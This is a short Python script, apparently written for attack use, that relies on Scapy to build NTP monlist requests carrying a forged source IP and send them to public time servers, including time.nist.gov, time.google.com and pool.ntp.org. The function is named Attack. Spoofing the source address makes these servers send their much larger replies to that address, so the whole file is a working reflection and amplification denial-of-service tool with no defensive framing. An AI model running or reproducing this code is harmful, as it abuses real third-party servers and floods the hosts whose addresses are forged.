from scapy.all import IP, UDP, send, Raw
from faker import Faker
import random

ntpServers = ["time.nist.gov", "time.google.com", "0.pool.ntp.org"]
fake = Faker()
# ntp_monlist = b'\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00'
ntp_monlist = bytes([0x17, 0x00, 0x03, 0x2a] + [0x00] * 8)


def Attack(requestPerServer):
    src_ip = fake.ipv4()
    for address in ntpServers:
        ip = IP(src=src_ip, dst=address)
        for i in range(requestPerServer):
            src_port = random.randint(1024, 65535)
            udp = UDP(sport=src_port, dport=123)
            packet = ip/udp/Raw(load= ntp_monlist)
            send(packet, verbose=False)
            print(f"{i} packets sent")
    pass
